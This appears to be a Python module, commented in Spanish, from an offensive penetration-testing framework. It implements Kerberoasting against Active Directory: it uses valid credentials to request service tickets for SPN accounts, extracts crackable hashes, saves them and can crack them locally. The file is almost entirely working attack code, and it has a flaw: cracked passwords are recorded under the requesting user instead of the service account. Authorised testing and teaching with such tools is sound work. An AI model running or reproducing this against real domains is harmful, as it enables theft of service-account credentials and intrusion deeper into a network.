# -*- coding: utf-8 -*-
"""
Módulo ad/kerberoast
====================
Kerberoasting (T1558.003): para cada cuenta con SPN se solicita un
TGS de servicio. El KDC lo cifra con el NT-hash de la CUENTA DE SERVICIO,
así que ese enc-part es un hash crackeable offline (hashcat -m 13100).

A diferencia de ad/asreproast, aquí hace falta preautenticación: el módulo
pide primero un TGT con credenciales válidas (PA-ENC-TIMESTAMP), extrae la
clave de sesión del AS-REP y lanza el TGS-REQ con un AP-REQ propio
(todo en core.krb5, sin dependencias).

Opcional CRACK=true: prueba una wordlist contra los hashes obtenidos
directamente desde la consola (RC4-HMAC puro en Python, sin hashcat).

Riesgo: MEDIO (pide un TGS por cuenta: evento 4769; el crackeo es offline).
ATT&CK: T1558.003 (Kerberoasting).
"""

import socket

from core.base_module import BaseModulo, ModuloError
from core import krb5
from modules.ad.kerberos_userenum import cargar_lista

SALIDA_RAIZ = __import__("pathlib").Path(__file__).resolve().parent.parent.parent / "output" / "ad"


class Kerberoast(BaseModulo):
    """Solicita TGS de cuentas con SPN y extrae hashes hashcat -m 13100."""

    NAME = "ad/kerberoast"
    CATEGORIA = "ad"
    DESCRIPCION = ("Kerberoasting: obtiene TGT con credenciales válidas y "
                   "solicita TGS de cuentas con SPN → hashes hashcat -m 13100. "
                   "CRACK=true permite probar una wordlist en local.")
    RIESGO = "medio"
    AUTOR = "REDHAVOC"
    REFERENCIA = "impacket/GetUserSPNs · MITRE ATT&CK T1558.003"
    ATTCK = ("T1558.003",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("RHOST", "", True, "IP o nombre del controlador de dominio (KDC)")
        self.opciones.declarar("REINO", "", True, "Reino Kerberos en MAYÚSCULAS (p. ej. CORP.LOCAL)")
        self.opciones.declarar("USUARIO", "", True, "Usuario válido para pedir el TGT")
        self.opciones.declarar("PASSWORD", "", True, "Contraseña del usuario")
        self.opciones.declarar("SPNS", "", False,
                               "Lista de SPNs separados por comas o fichero @ruta "
                               "(vacío = usar el resultado de ad/spn_enum si existe)")
        self.opciones.declarar("CRACK", "false", False,
                               "Probar WORDLIST contra los hashes en local (puro Python)")
        self.opciones.declarar("WORDLIST", "templates/wordlists/ad_claves.txt", False,
                               "Fichero de contraseñas para CRACK")
        self.opciones.declarar("TCP", "true", False, "Usar TCP/88 (recomendado)")

    def ejecutar(self) -> dict:
        host = self._objetivo_host(self.opt("RHOST"))
        reino = self.opt("REINO").strip().upper()
        usuario = self.opt("USUARIO").strip()
        contrasena = self.opt("PASSWORD")
        tcp = self.opt_bool("TCP", True)
        crackear = self.opt_bool("CRACK", False)
        timeout = self.opt_int("TIMEOUT", 5) or 5

        spns = cargar_lista(self.opt("SPNS")) if self.opt("SPNS") else []
        if not spns:
            spns = self._spns_de_spn_enum()
        if not spns:
            raise ModuloError("Sin SPNs: lanza ad/spn_enum antes o fija SPNS=val1,val2")

        hashes, errores = [], []
        for spn in spns:
            try:
                resultado = krb5.obtener_tgs(host, usuario, contrasena, reino,
                                             spn, timeout=timeout, tcp=tcp)
            except (socket.timeout, TimeoutError):
                errores.append({"spn": spn, "motivo": "timeout del KDC"})
                continue
            except OSError as err:
                errores.append({"spn": spn, "motivo": f"red: {err}"})
                continue
            if resultado["tipo"] == "tgsrep":
                hashes.append(resultado["hash"])
            else:
                motivo = resultado.get("motivo", "error desconocido")
                errores.append({"spn": spn, "motivo": motivo})
                # contraseña mala o KDC caído: no insistir con el resto
                if resultado.get("fase") == "asreq":
                    raise ModuloError(f"No se pudo obtener el TGT: {motivo}")
                    # (solo se llega a lanzar el resto si el fallo es por SPN)

        crakeados = {}
        if crackear and hashes:
            candidatos = cargar_lista(self.opt("WORDLIST")) or []
            crakeados = krb5.crackear_hashes_kerberos(hashes, candidatos)

        if hashes:
            SALIDA_RAIZ.mkdir(parents=True, exist_ok=True)
            destino = SALIDA_RAIZ / f"kerberoast_{reino.lower()}.txt"
            destino.write_text("\n".join(hashes) + "\n", encoding="utf-8")
        else:
            destino = None

        self.ctx.workspace.add_host(host, notas=f"KDC {reino}")
        self.ctx.workspace.add_service(host, 88, "KERBEROS")
        for pwd_crackeada in {p for p in crakeados.values()}:
            self.ctx.workspace.add_cred(host, usuario, pwd_crackeada, "kerberoast")

        resumen = (f"Kerberoast {reino}: {len(hashes)}/{len(spns)} TGS obtenidos"
                   + (f" · {len(crakeados)} crackeados" if crakeados else "")
                   + (f" → hashes en {destino}" if destino else ""))
        return {
            "resumen": resumen,
            "reino": reino,
            "usuario": usuario,
            "spns": spns,
            "hashes": hashes,
            "crackeados": [{"hash": h, "password": p} for h, p in crakeados.items()],
            "errores": errores,
            "fichero": str(destino) if destino else "",
            "como_crackear": ("hashcat -m 13100 hashes.txt diccionario.txt "
                              "(SOLO en el laboratorio autorizado)")
            if not crakeados else "",
        }

    # ------------------------------------------------------------------
    def _spns_de_spn_enum(self) -> list:
        """Reutiliza el informe JSON más reciente de ad/spn_enum (envoltura
        del reporter: output/<marca>_ad-spn_enum.json)."""
        import json
        informes = sorted(SALIDA_RAIZ.parent.glob("*_ad-spn_enum.json"))
        if not informes:
            return []
        try:
            datos = json.loads(informes[-1].read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return []
        spns = []
        for cuenta in datos.get("resultados", {}).get("cuentas", []):
            spns.extend(cuenta.get("spns", []))
        return spns
